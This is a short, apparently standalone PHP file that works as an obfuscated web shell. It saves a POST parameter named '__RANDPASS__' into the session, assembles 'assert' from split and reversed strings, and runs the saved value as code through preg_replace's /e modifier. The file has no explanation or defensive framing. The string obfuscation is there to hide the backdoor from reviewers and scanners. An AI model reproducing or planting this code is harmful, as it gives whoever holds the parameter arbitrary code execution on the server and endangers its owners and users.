<?php
session_start();
$_POST['__RANDPASS__'] && $_SESSION['id'] = trim($_POST['__RANDPASS__']);
$_SESSION['id']&&preg_replace('\'a\'eis','a'.'s'.strrev('tres').'($_SESSION[\'id\'])','a');
?>